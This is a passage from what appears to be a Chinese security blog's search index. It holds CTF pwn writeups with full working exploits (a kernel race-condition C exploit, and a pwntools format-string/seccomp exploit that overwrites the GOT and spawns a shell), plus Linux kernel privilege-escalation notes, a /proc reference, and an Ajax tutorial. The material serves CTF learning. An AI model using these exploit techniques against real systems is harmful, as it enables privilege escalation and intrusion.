"p64")(1111). 对原始关键字做出种种处理来bypass源码扫描:f3ck = __import__("pbzznaqf".decode('rot_13')). 使用# coding:&lt;encoding&gt;编码整个文件. python沙盒模板 12345678910111213141516171819import __builtins__banned = [ "system"]del __builtins__.__dict__['execfile']del __builtins__.__dict__['reload']while 1: print("&gt;&gt;&gt;") data = raw_input() for no in banned: if no.lower() in data.lower(): print("No bueno") break else: exec(data)]]></content>
      <categories>
        <category>IS</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>escape</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-0ctf-2018-finals-babykernel]]></title>
    <url>%2Fposts%2F6d245606%2F</url>
    <content type="text"><![CDATA[分析 当ioctl中cmd参数为0x6666时,驱动将输出flag的加载地址. 当ioctl中cmd参数为0x1337时,首先进行三个校验,接着对用户输入的内容与硬编码的flag进行逐字节比较,一致则将flag输出. 三个校验为:输入的数据指针是否为用户态数据;数据指针内flag_str是否指向用户态;数据指针内flag_len是否等于硬编码flag的长度. 当用户输入数据通过验证后,再将flag_str所指向的地址改为flag硬编码地址后,就会输出flag. 环境问题 在启动脚本中加入echo 0 &gt; /proc/sys/kernel/dmesg_restrict关闭dmesg_restrict,否则无法查看printk信息. 配置QEMU启动参数时,不要开启SMAP保护,否则在内核中直接访问用户态数据会引起kernel panic. 配置QEMU启动参数时,不能配置为非单核单线程启动,否则无法触发竞争条件.具体操作是在启动参数中增加其内核数选项:cores=2,threads=1. 利用思路 首先0x6666获取内核中flag的加载地址,通过dmesg命令查看. 然后构造符合0x1337功能的数据结构,其中flag_len可以从硬编码中直接获取为33,flag_str指向一个用户空间地址. 最后,创建一个线程不断修改flag_str为flag的内核地址以制造竞争条件,输出flag. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;fcntl.h&gt;#include &lt;pthread.h&gt;#define TRYTIME 0x1000struct ttt &#123; char * ptr; size_t len;&#125;;char * flag_addr;int finish = 0;char buf[100];void change_flag_str(struct ttt * check)&#123; while(!finish)&#123; check-&gt;ptr = flag_addr; &#125;&#125;int main(void)&#123; char *idx; int fd; pthread_t t; struct ttt check; setvbuf(stdin,0,2,0); setvbuf(stdout,0,2,0); setvbuf(stderr,0,2,0); fd = open("/dev/baby", 0); ioctl(fd, 0x6666); system("dmesg"); scanf("%llu", &amp;flag_addr); printf("flag_addr: %p\n", flag_addr); check.len = 33; check.ptr = buf; pthread_create(&amp;t, NULL, change_flag_str, &amp;check); for(int i = 0;i &lt; TRYTIME;i++) &#123; ioctl(fd, 0x1337, &amp;check); check.ptr = buf; &#125; finish = 1; pthread_join(t, NULL); close(fd); system("dmesg | grep flag"); return 0;&#125; 12gcc -static exp.c -lpthread -o exp#-lpthread用于链接多线程动态库 非预期解法 此题存在一种侧信道攻击的非预期解法.由于是flag是硬编码且检查方法是逐字节比较,因此可以逐字节爆破来得到flag. 方法是将待爆破的字节放在mmap申请的内存页末位,此时下一字节位于不可读写的用户态空间.当得到正确的一字节时,内核会比较用户空间内下一个字节的正确性,由于该地址是不可读的,将导致kernel panic,从而可以判断是否爆破的一个字节正确.]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-pwn-Linux-kernel-常见漏洞利用]]></title>
    <url>%2Fposts%2F5b0114cb%2F</url>
    <content type="text"><![CDATA[栈漏洞利用 12int commit_creds(struct cred * new);struct cred * prepare_kernel_cred(struct task_struct * daemon); 通过栈溢出漏洞写入ROP链调用commit_creds(prepare_kernel_cred(0))等函数进行提权,这种攻击方法首先要泄露内核基址. 与用户态栈溢出不同的是这里需要返回用户态getshell(如果开了SMEP),也就是要通过ROP模拟内核态退出到用户态的流程. 1234567891011121314151617181920212223unsigned long user_cs, user_ss, user_eflags, user_sp;void save_stats()&#123; asm( "movq %%cs, %0\n" "movq %%ss, %1\n" "movq %%rsp, %3\n" "pushfq\n" "popq %2\n" :"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp) : : "memory" );&#125;// 栈排布.// &amp;set_uid// swapgs_pop_ebp_ret// rbp(padding)// iret_addr// &amp;getshell// user_cs// user_rflags// user_rsp// user_ss ret2usr ret2usr攻击利用用户空间的进程不能访问内核空间,但内核空间能访问用户空间的特性来定向内核代码或数据流指向用户空间,以Ring 0特权执行用户空间代码完成提权等操作. 可以直接ROP劫持控制流返回到用户空间代码提权. 也可以利用tty_struct结构体的ops函数表劫持控制流,因为rax中存储着伪造的函数表指针,通过mov rsp, rax,xchg rsp, rax这种ROPgadget即可将栈转换到用户态来构造ROP. ret2dir linux内核在设计的时候,为了提高内存的操作效率,在用户空间映射内存的时候,内核也相应地在内核的低端内存区地址映射一段影子内存physmap. 攻击者可以将用户空间的攻击代码映射到内核的低端内存可执行区或者将特定数据进行喷射到内核的低端内存,进行内存布局,然后利用漏洞让内核执行攻击代码,从而达到提权的目的,这项技术在32位arm设备上有60%以上的成功率,而在64位arm中有96%的成功率. 2016年7月google在android PIXEL(内核3.18-16.04)版本以后封杀了ret2dir的攻击方式. bypass-smep smep(Supervisor Mode Execution Protection)是内核的一种保护措施,作用是当CPU处于Ring 0模式时,执行用户空间代码会触发页错误,这个保护在ARM中被称为PXN. 可以通过grep smep /proc/cpuinfo检测该保护是否开启. 系统根据CR4寄存器的值判断是否开启smep保护,当CR4寄存器的第20位是1时,保护开启;为0时关闭.而CR4寄存器是可以通过mov指令修改的. 123pop rdi;0x6f0retmov cr4, rdi 关闭smep后就可以使用常规的ret2usr攻击. 堆漏洞利用 slub attack slub分配器释放过的堆块类似于glibc的fastbin,后入先出,存在FD指针指向下一块空闲的块.构造单链结构即可泄露堆地址,构造任意地址写. Double Fetch Double Fetch从漏洞原理上属于条件竞争漏洞,是一种内核态与用户态之间的数据访问竞争. 一个典型的Double Fetch漏洞:一个用户态线程准备数据并通过系统调用进入内核,该数据在内核中有两次被取用,内核第一次取用数据进行安全检查,当检查通过后内核第二次取用数据进行实际处理.而在两次取用数据之间,另一个用户态线程可创造条件竞争,对已通过检查的用户态数据进行篡改,在真实使用时造成访问越界或缓冲区溢出. UAF 内核态的堆管理机制不太一样,但原理类似. 由于cred结构体是使用kmem_cache_alloc分配的,所以可以通过申请相同大小的内存获取cred从而篡改cred. 对tty驱动分配的设备节点调用open时,tty核心使用一个指向分配给这个设备的tty_struct结构的指针调用它,也就是说对驱动设备调用open函数后内核会通过kmalloc申请一个tty_struct结构体.而tty_struct结构体有一个成员:const struct tty_operations *ops;,是一个存放函数指针的结构体(类似虚函数表). 这里使用的分配机制为slub,所以可以通过UAF控制tty_struct结构体来指向伪造的tty_operations,从而劫持控制流. 1234567891011struct tty_operations &#123; struct tty_struct * (*lookup)(struct tty_driver *driver, struct file *filp, int idx); int (*install)(struct tty_driver *driver, struct tty_struct *tty); void (*remove)(struct tty_driver *driver, struct tty_struct *tty); int (*open)(struct tty_struct * tty, struct file * filp); void (*close)(struct tty_struct * tty, struct file * filp); void (*shutdown)(struct tty_struct *tty); void (*cleanup)(struct tty_struct *tty); int (*write)(struct tty_struct * tty, const unsigned char *buf, int count); //more&#125; __randomize_layout; 其他漏洞 thread_info-&gt;addr_limit thread_info-&gt;addr_limit用于限制用户态程序能访问的地址的最大值,如果把它修改成0xffffffffffffffff就可以利用pipe读写整个内存空间,包括内核空间. 12345678910int pipefd[2];//pipe(pipefd)初始化int kmemcpy(void *dest, void *src, size_t size) &#123; write(pipefd[1], src, size); read(pipefd[0], dest, size); return size;&#125;//如果是泄露内核数据的话,dest为内核地址,src为内核地址,同时要关闭smap.//如果是对内核数据进行写操作,dest为内核地址,src为用户态地址. thread_info位于内核栈顶部而且是THREAD_SIZE对齐的,THREAD_SIZE可以为4k,8k或者是16k,利用stack_addr &amp; (~(THREAD_SIZE - 1))就可以计算出thread_info的地址. 通过thread_info的地址可以拿到task_struct(thread_info-&gt;task)的地址,进一步获取task_struct-&gt;real_cred和task_struct-&gt;cred的地址,修改task_struct-&gt;real_cred一直到 fsuid字段为0,修改task_struct-&gt;cred为task_struct-&gt;real_cred从而提权. 在内核中set_fs是一个用于设置thread_info-&gt;addr_limit的宏,利用这个,再加上一些条件,可以直接修改thread_info-&gt;addr_limit.]]></content>
      <categories>
        <category>IS</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>Linux-kernel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-operations-Linux-文件与目录]]></title>
    <url>%2Fposts%2F6883f3a7%2F</url>
    <content type="text"><![CDATA[FHS FHS(Filesystem Hierarchy Standard)是一个标准,主要是关于如何规范Linux种软件与数据的存放. FHS依据文件系统使用的频繁与否和是否允许用户随意改动将目录定义成为四种交互作用的形态:可分享的/不可分享的,不变的/可变动的. 可分享的指能够分享给网络上其他主机挂载的目录,不可分享就是不能,即是否允许用户随意改动. 不变可变主要依据文件系统使用的频繁. FHS针对目录树架构仅定义出三层目录下面应该放置什么数据. /(根目录):与开机系统有关. /usr(UNIX software resource):与软件安装/执行有关. /var(variable):与系统运作过程有关. 根目录(/) 所有的目录都是由根目录衍生而来,同时根目录也与开机,还原,系统修复等操作有关./所在分区越小越好,同时应用程序最好也不要存放在这个分区. FHS定义了/下面应该存在的子目录. /bin:放置单用户维护模式还能被使用的命令,即可以被root与一般用户使用. /boot:放置开机使用到的文件,包括Linux内核文件(vmlinuz),开机菜单和开机配置文件等,如果使用grub(引导装载程序)则会还存在/boot/grub. /dev:任意设备与接口设备都以文件的形式存在这个目录,通过访问该目录下的文件可以访问设备. /etc:放置系统的主要配置文件,如:帐号文件和密码文件.其中还有几个重要的子目录:/etc/init.d/存放服务的默认启动脚本./etc/xinetd.d/是super daemon管理的各项服务的配置文件目录. /home:用户主文件夹. /lib:放置开机时会用到的动态库,以及/bin和/sbin下命令会调用的动态库.其中/lib/modules/存放内核相关的模块. /media:放置可删除的设备,如:DVD,软盘,光盘等设备. /mnt:早期的设定与/media目录一样,现在用于暂时挂载设备. /opt:放置第三方软件.(以前的Linux系统种习惯放置在/usr/local目录下) /root:root的主文件夹. /sbin:放置开机过程所需要的命令,如开机,修复,还原系统所需要的命令.服务器软件程序一般放置/usr/sbin/,本机自行安装的软件产生的系统执行文件放置到/usr/local/sbin/. /srv:放置网络服务所需要的数据. /tmp:让一般用户或正在执行的程序放置临时文件的地方. Linux中还有一些比较重要的目录. /lost+found:当使用标准的ext2/3文件系统格式时会有,当文件系统发送错误会将一些丢失的片段放置在这里. /proc:这个目录本身就是一个虚拟文件系统,数据存在内存中,放置系统内核,进程,外部设备的状态及网络信息等. /sys:同上是以恶搞虚拟文件系统,数据也存在内存中,也就是不占用硬盘,用于记录与内核有关的信息. 开机过程中仅有根目录所在分区会挂载,其他分区在开机完成后才会挂载.所以以下目录必须与根目录在同一分区:etc,bin,dev,lib,sbin. proc /proc中存储的是当前内核运行状态的一系列特殊文件(被称作虚拟文件),可以通过这些文件查看有关系统硬件及当前正在运行进程的信息,甚至可以通过更改其中某些文件来改变内核的运行状态. /proc/pid /proc目录中包含许多以数字命名的子目录,这些数字表示系统当前正在运行进程的进程号,里面包含对应进程相关的多个信息文件. cmdline:启动当前进程的完整命令,僵尸进程目录中的此文件不包含任何信息. cwd:指向当前进程运行目录的一个符号链接. environ:当前进程的环境变量列表,彼此间用空字符隔开. exe:指向启动当前进程的可执行文件的符号链接,通过/proc/pid/exe可以启动当前进程的一个拷贝. fd:这是个目录,包含当前进程打开的每一个文件的文件描述符,这些文件描述符是指向实际文件的一个符号链接. limits:当前进程所使用的每一个受限资源的软限制,硬限制和管理单元;此文件仅可由实际启动当前进程的UID用户读取. maps:当前进程关联到的每个可执行文件和库文件在内存中的映射区域及其访问权限所组成的列表. mem:当前进程所占用的内存空间,由open,read和lseek等系统调用使用,不能被用户读取. root:指向当前进程运行根目录的符号链接;在Unix和Linux系统上,通常采用chroot命令使每个进程运行于独立的根目录. stat:当前进程的状态信息,包含一系统格式化后的数据列,可读性差,通常由ps命令使用. statm:前进程占用内存的状态信息,通常以页面page表示. status:与stat所提供信息类似,但可读性较好. task:目录文件,包含由当前进程所运行的每一个线程的相关信息,每个线程的相关信息文件均保存在一个由线程号tid命名的目录中,这类似于其内容类似于每个进程目录中的内容. /proc目录下常见文件 /proc/apm:高级电源管理APM版本信息及电池相关状态信息,通常由apm命令使用. /proc/buddyinfo:用于诊断内存碎片问题的相关信息文件. /proc/cmdline:在启动时传递至内核的相关参数信息,这些信息通常由lilo或grub等启动管理工具进行传递. /proc/cpuinfo:处理器的相关信息的文件. /proc/crypto:系统上已安装的内核使用的密码算法及每个算法的详细信息列表. /proc/devices:系统已经加载的所有块设备和字符设备的信息,包含主设备号和设备组(与主设备号对应的设备类型)名. /proc/diskstats:每块磁盘设备的磁盘I/O统计信息列表. /proc/dma:每个正在使用且注册的ISA DMA通道的信息列表. /proc/execdomains:内核当前支持的执行域信息列表. /proc/fb:帧缓冲设备列表文件,包含帧缓冲设备的设备号和相关驱动信息. /proc/filesystems:当前被内核支持的文件系统类型列表文件,被标示为nodev的文件系统表示不需要块设备的支持;通常mount一个设备时,如果没有指定文件系统类型将通过此文件来决定其所需文件系统的类型. /proc/interrupts:X86或X86_64体系架构系统上每个IRQ相关的中断号列表;多路处理器平台上每个CPU对于每个I/O设备均有自己的中断号. /proc/iomem:每个物理设备上的记忆体(RAM或者ROM)在系统内存中的映射信息. /proc/ioports:当前正在使用且已经注册过的与物理设备进行通讯的输入输出端口范围信息列表. /proc/kallsyms:模块管理工具用来动态链接或绑定可装载模块的符号定义,由内核输出. /proc/kcore:系统使用的物理内存,以ELF核心文件格式存储,其文件大小为已使用的物理内存加上4KB.这个文件用来检查内核数据结构的当前状态,通常由gdb等调试工具使用,不能使用文件查看命令打开此文件. /proc/kmsg:用来保存由内核输出的信息,通常由/sbin/klogd或/bin/dmsg等程序使用,不要试图使用查看命令打开此文件. /proc/loadavg:保存关于CPU和磁盘I/O的负载平均值. /proc/locks:保存当前由内核锁定的文件的相关信息,包含内核内部的调试数据,每个锁定占据一行,且具有一个惟一的编号. /proc/mdstat:保存RAID相关的多块磁盘的当前状态信息. /proc/meminfo:系统中关于当前内存的利用状况等的信息,常由free命令使用. /proc/mounts:在内核2.4.29版本以前,此文件的内容为系统当前挂载的所有文件系统,在2.4.19以后的内核中引进了每个进程使用独立挂载名称空间,此文件变成了指向/proc/self/mounts(每个进程自身挂载名称空间中的所有挂载点列表)文件的符号链接. /proc/modules:当前装入内核的所有模块名称列表,可以由lsmod命令使用. /proc/partitions:块设备每个分区的主设备号(major)和次设备号(minor)等信息,同时包括每个分区所包含的块(block)数目. /proc/pci:内核初始化时发现的所有PCI设备及其配置信息列表,其配置信息多为某PCI设备相关IRQ信息.可以用/sbin/lspci –vb命令获得较易理解的相关信息.在2.6内核以后此文件已被/proc/bus/pci目录及其下的文件代替. /proc/slabinfo:在内核中频繁使用的对象(如inode,dentry等)都有自己的cache,即slab pool,而/proc/slabinfo文件列出了这些对象相关slap的信息. /proc/stat:实时追踪自系统上次启动以来的多种统计信息. /proc/swaps:当前系统上的交换分区及其空间利用信息,如果有多个交换分区的话,则会每个交换分区的信息分别存储于/proc/swap目录中的单独文件中,而其优先级数字越低,被使用到的可能性越大. /proc/uptime:系统上次启动以来的运行时间. /proc/version:当前系统运行的内核版本号. /proc/vmstat:当前系统虚拟内存的多种统计数据. /proc/zoneinfo:内存区域zone的详细信息列表. /proc/sys:与/proc下其它文件的只读属性不同的是,root可对/proc/sys子目录中的许多文件内容进行修改以更改内核的运行特性,需要注意的是,即使文件可写,其一般也不可以使用编辑器进行编辑./proc/sys/debug子目录通常是一空目录./proc/sys/dev子目录为系统上特殊设备提供参数信息文件的目录,其不同设备的信息文件分别存储于不同的子目录中.如/proc/sys/dev/cdrom和/proc/sys/dev/raid(如果内核编译时开启了支持raid的功能)目录,其内存储的通常是系统上cdrom和raid的相关参数信息文件. usr /usr目录的数据是属于可分享且不可变动的,一般会占用较大的硬盘容量. FHS定义了/usr下面应该存在的子目录. /usr/X11R6:放置X Window系统的重要数据. /usr/bin:放置着绝大部分的用户可使用命令. /usr/include:放置C/C++等程序语言的头文件. /usr/lib:放置各应用软件动态库,目标文件以及不被一般用户惯用的执行文件或脚本. /usr/local:用于放置系统管理员自己安装的软件,该目录下具有bin,etc等子目录. /usr/sbin:非系统正常运行所需要的系统命令,如某些网络服务器软件的服务命令. /usr/share:放置共享文件的地方. /usr/src:放置源码. var /usr目录的数据是属于可变动的,包括缓存,登陆文件以及某些软件运行所产生的文件. 常见子目录如下. /var/cache:应用程序本身运行过程中会产生的一些暂存文件. /var/lib:放置程序本身执行过程中需要使用的数据文件,该目录下各程序都有自己的子目录. /var/lock:放置锁. /var/log:放置登陆文件. /var/mail:放置个人电子邮件信箱的目录,与/var/spool/mail互为连接文件. /var/run:放置某些程序或服务启动后的PID. /var/spool:放置一些队列数据. 目录与路径]]></content>
      <categories>
        <category>CS</category>
        <category>operations</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-develop-FrontEnd-Ajax]]></title>
    <url>%2Fposts%2F4ba62e47%2F</url>
    <content type="text"><![CDATA[概览 Ajax指异步的JavaScript和XML,是对构建动态Web应用程序所必备技术的一个统称,由JavaScript与CSS,XML,DOM加上XMLHttpRequest组成. XMLHttpRequest Ajax的实现主要依赖XMLHttpRequest对象,该对象也是Ajax的核心. 获取XMLHttpRequest对象. 1234567891011121314151617var request = false;if(window.XMLHttpRequest) &#123; request = new XMLHttpRequest(); if(request.overrideMimeType) &#123; request.overrideMimeType('text/xml'); &#125;&#125;else if(window.ActiveXObject) &#123; var versions = ['Microsoft.XMLHTTP','MSXML.XMLHTTP','Microsoft.XMLHTTP'];//... for(var i = 0;i &lt; versions.length;i++) &#123; try &#123; request = new ActiveXObject(versions[i]); &#125; catch(e) &#123;&#125; &#125;&#125;xmlhttp = request; XMLHttpRequest对象的方法. abort():终止当前的请求. getAllResponseHeaders():把HTTP请求的所有相应首部作为键值对返回. getResponseHeader("header"):把HTTP请求的指定首部的值返回. open("method", "url"[, async, username, password]):建立对服务器的调用. send(content):向服务器发送请求. setRequestHeader("header", "value"):设置首部属性,必须先调用open()方法. XMLHttpRequest对象的属性. onreadystatechange:每个状态改变都会触发,是一个函数. responseText:文本格式的响应. readyState:请求的状态,0表示未初始化的请求,1表示打开的请求,2表示已发出的请求,3表示正在接收的响应,4表示响应加载完毕. responseXML:XML格式的响应. status:服务器的HTTP状态,比如200,404等. statusText:HTTP状态对应的文本. HTTP通信 发送GET/POST请求. 123456789xmlhttp.open("GET", url);xmlhttp.send();//GETxmlhttp.open("POST", url);xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencode")param = "id=1&amp;user=admin";xmlhttp.send(param);//POST 读取HTTP响应. 1234567xmlhttp.open("GET", url);xmlhttp.onreadystatechange = function() &#123; if(xmlhttp.readyState == 4) &#123; console.log(xml.responseText); &#125;&#125;;xmlhttp.send();]]></content>
      <categories>
        <category>CS</category>
        <category>develop</category>
      </categories>
      <tags>
        <tag>FrontEnd</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-中国技能大赛-pwn2]]></title>
    <url>%2Fposts%2F335e0730%2F</url>
    <content type="text"><![CDATA[漏洞 程序add中存在格式化字符串漏洞,但是由于开了FORTIFY,无法使用%n写,又因为输出流是stderr,无法泄露. 函数build无用,free操作无漏洞.发现set函数中使用了prctl函数,且存在edit函数修改规则对应的数据.参考secretcenter. seccomp seccomp是在内核中实现的对于用户系统调用及其参数的过滤,决定是否继续调用此系统调用.(工具seccomp-tools) prctl函数在这里实际上就是设置对应的规则,其中rule可控,也就是说可以控制其规则. 1234prctl(38, 1LL, 0LL, 0LL, 0LL);v1 = 11;v2 = rule;prctl(22, 2LL, &amp;v1, *(_QWORD *)&amp;v1, rule); 使用seccomp-tools分析原规则. 123456789101112131415161718192021222324252627282930seccomp-tools dump ./pwnThis is an easy pwn.Enjoy it1.add2.delete3.build4.set5.exitYour choice : 31.add2.delete3.build4.set5.exitYour choice : 4 line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x08 0xc000003e if (A != ARCH_X86_64) goto 0010 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x15 0x06 0x00 0x00000002 if (A == open) goto 0010 0004: 0x15 0x05 0x00 0x00000039 if (A == fork) goto 0010 0005: 0x15 0x04 0x00 0x0000003b if (A == execve) goto 0010 0006: 0x15 0x03 0x00 0x00000065 if (A == ptrace) goto 0010 0007: 0x15 0x02 0x00 0x00000101 if (A == openat) goto 0010 0008: 0x15 0x01 0x00 0x00000130 if (A == open_by_handle_at) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0010: 0x06 0x00 0x00 0x00000000 return KILL fprintf_chk fprintf_chk执行%n会报错. 1*** %n in writable segment detected *** 检测逻辑(glibc2.23). 123456789LABEL (form_number): if (s-&gt;_flags2 &amp; _IO_FLAGS2_FORTIFY) &#123; if (! readonly_format) &#123; extern int __readonly_area (const void *, size_t) attribute_hidden; readonly_format = __readonly_area (format, ((STR_LEN (format) + 1) * sizeof (CHAR_T))); &#125; if (readonly_format &lt; 0) __libc_fatal ("*** %n in writable segment detected ***\n"); &#125; __readonly_area通过fopen打开/proc/self/maps,来判断format是否是只读段. 结构体__IO_FILE利用_fileno来判定是哪个文件. 12345678910111213141516171819202122232425_IO_FILE * _IO_file_open (_IO_FILE *fp, const char *filename, int posix_mode, int prot, int read_write, int is32not64) &#123; int fdesc;#ifdef _LIBC if (__glibc_unlikely (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL)) fdesc = open_not_cancel (filename, posix_mode | (is32not64 ? 0 : O_LARGEFILE), prot); else fdesc = open (filename, posix_mode | (is32not64 ? 0 : O_LARGEFILE), prot);#else fdesc = open (filename, posix_mode, prot);#endif if (fdesc &lt; 0) return NULL; fp-&gt;_fileno = fdesc; _IO_mask_flags (fp, read_write,_IO_NO_READS+_IO_NO_WRITES+_IO_IS_APPENDING); if ((read_write &amp; (_IO_IS_APPENDING | _IO_NO_READS)) == (_IO_IS_APPENDING | _IO_NO_READS)) &#123; _IO_off64_t new_pos = _IO_SYSSEEK (fp, 0, _IO_seek_end); if (new_pos == _IO_pos_BAD &amp;&amp; errno != ESPIPE) &#123; close_not_cancel (fdesc); return NULL; &#125; &#125; _IO_link_in ((struct _IO_FILE_plus *) fp); return fp;&#125;libc_hidden_def (_IO_file_open) 而stdin._fileno = 0,所以可以控制seccomp让fopen("/proc/self/maps")返回ERROR,此时,open的返回值为0,此时fopen认为其fileno是0,程序会从STDIN中读取数据,进行判断. 此时只需要输入000000000000-7fffffffffff r-xp 00000000 00:00 0 /bin/w4rd3n即可绕过%n检测. 规则构造 12345678910111213A = archA == ARCH_X86_64 ? next : deadA = sys_numberA == close ? dead : nextA == exit_group ? dead : nextA == open ? next : allowA = args[0]A &amp;= 0xffA == 0x7c ? dead : nextallow:return ALLOWdead:return ERRNO(0) 利用seccomp-tools生成规则. 1234567891011121314seccomp-tools asm rule.asm -a amd64 -f raw | seccomp-tools disasm - line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x08 0xc000003e if (A != ARCH_X86_64) goto 0010 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x15 0x06 0x00 0x00000003 if (A == close) goto 0010 0004: 0x15 0x05 0x00 0x000000e7 if (A == exit_group) goto 0010 0005: 0x15 0x00 0x03 0x00000002 if (A != open) goto 0009 0006: 0x20 0x00 0x00 0x00000010 A = args[0] 0007: 0x54 0x00 0x00 0x000000ff A &amp;= 0xff 0008: 0x15 0x01 0x00 0x0000007c if (A == 124) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0010: 0x06 0x00 0x00 0x00050000 return ERRNO(0) 利用 利用就很常规了,got表可写. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140from pwn import *context.log_level = "debug"def add(size, content): r.sendline('1') r.sendlineafter('input the size', str(size)) r.sendafter('input your content: ', content) data = r.recvuntil('Your choice : \n') return datadef delete(): r.sendline('2') r.recvuntil('Your choice : \n')def sets(): r.sendline('4') r.recvuntil('Your choice : \n')def edit(size, content): r.sendline('666') r.sendlineafter('input yout choice: \n', str(1)) r.sendlineafter('input the size\n', str(size)) r.sendafter('input your content\n', content) r.recvuntil('Your choice : \n')def rule(code, jt ,jf ,k): return p16(code) + p8(jt) + p8(jf) + p32(k)def build_rule(): payload = '' payload += rule(0x20, 0x00, 0x00, 0x00000004) # A = arch payload += rule(0x15, 0x00, 0x08, 0xc000003e) # if (A != ARCH_X86_64) goto 0010 payload += rule(0x20, 0x00, 0x00, 0x00000000) # A = sys_number payload += rule(0x15, 0x06, 0x00, 0x00000003) # if (A == close) goto 0010 payload += rule(0x15, 0x05, 0x00, 0x000000e7) # if (A == exit_group) goto 0010 payload += rule(0x15, 0x00, 0x03, 0x00000002) # if (A != open) goto 0009 payload += rule(0x20, 0x00, 0x00, 0x00000010) # A = args[0] payload += rule(0x54, 0x00, 0x00, 0x000000ff) # A &amp;= 0xff payload += rule(0x15, 0x01, 0x00, 0x0000007c) # if (A == 124) goto 0010 payload += rule(0x06, 0x00, 0x00, 0x7fff0000) # return ALLOW payload += rule(0x06, 0x00, 0x00, 0x00050000) # return ERRNO(2) return payloadr = process("./pwn")#r = remote("192.168.100.102", "50002")r.recvuntil('Your choice : \n')new_rule = build_rule()edit(len(new_rule), new_rule)sets()#gdb.attach(r, "b __fprintf_chk\nc")r.sendline('1')r.sendlineafter('input the size', str(0x30))r.sendafter('input your content: ', "%16p%16p%16p%ln")sleep(1)maps = '000000000000-7fffffffffff r-xp 00000000 00:00 0 /bin/w4rd3n'r.sendline(maps)r.recvuntil("[heap]\n")libc = int(r.recvuntil("-")[:-1], 16)r.recvuntil('Your choice : \n')system = libc + 0x45390r.sendline('1')r.sendlineafter('input the size', str(0x80))fmt = "%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%" + str((system % 0x100) - 0x58) + "x%hhn"fmt = fmt.ljust(0x38, "a")fmt += p64(0x602018)[:6]r.sendafter('input your content: ', fmt)sleep(1)maps = '000000000000-7fffffffffff r-xp 00000000 00:00 0 /bin/w4rd3n'r.sendline(maps)r.recvuntil('Your choice : \n')r.sendline('1')r.sendlineafter('input the size', str(0x80))fmt = "%c%c%c%c%c%c%c%c%c%c%c%" + str(((system / 0x100) % 0x100) - 11) + "x%hhn"fmt = fmt.ljust(0x38, "a")fmt += p64(0x602018 + 1)[:6]r.sendafter('input your content: ', fmt)sleep(1)maps = '000000000000-7fffffffffff r-xp 00000000 00:00 0 /bin/w4rd3n'r.sendline(maps)r.recvuntil('Your choice : \n')r.sendline('1')r.sendlineafter('input the size', str(0x80))fmt = "%c%c%c%c%c%c%c%c%c%c%c%" + str(((system / 0x10000) % 0x100) - 11) + "x%hhn"fmt = fmt.ljust(0x38, "a")fmt += p64(0x602018 + 2)[:6]r.sendafter('input your content: ', fmt)sleep(1)maps = '000000000000-7fffffffffff r-xp 00000000 00:00 0 /bin/w4rd3n'r.sendline(maps)r.recvuntil('Your choice : \n')r.sendline('1')r.sendlineafter('input the size', str(0x80))fmt = "%c%c%c%c%c%c%c%c%c%c%c%" + str(((system / 0x1000000) % 0x100) - 11) + "x%hhn"fmt = fmt.ljust(0x38, "a")fmt += p64(0x602018 + 3)[:6]r.sendafter('input your content: ', fmt)sleep(1)maps = '000000000000-7fffffffffff r-xp 00000000 00:00 0 /bin/w4rd3n'r.sendline(maps)r.recvuntil('Your choice : \n')r.sendline('1')r.sendlineafter('input the size', str(0x80))fmt = "%c%c%c%c%c%c%c%c%c%c%c%" + str(((system / 0x100000000) % 0x100) - 11) + "x%hhn"fmt = fmt.ljust(0x38, "a")fmt += p64(0x602018 + 4)[:6]r.sendafter('input your content: ', fmt)sleep(1)maps = '000000000000-7fffffffffff r-xp 00000000 00:00 0 /bin/w4rd3n'r.sendline(maps)r.recvuntil('Your choice : \n')r.sendline('1')r.sendlineafter('input the size', str(0x80))fmt = "%c%c%c%c%c%c%c%c%c%c%c%" + str(((system / 0x10000000000) % 0x100) - 11) + "x%hhn"fmt = fmt.ljust(0x38, "a")fmt += p64(0x602018 + 5)[:6]r.sendafter('input your content: ', fmt)sleep(1)maps = '000000000000-7fffffffffff r-xp 00000000 00:00 0 /bin/w4rd3n'r.sendline(maps)r.recvuntil('Your choice : \n')add(0x60, "/bin/sh\x00")r.sendline('2')print "libc: " + hex(libc)print "system: " + hex(system) #gdb.attach(r)r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-pwn-Windows-SafeSEH绕过]]></title>
    <url>%2Fposts%2F802ef8e5%2F</url>
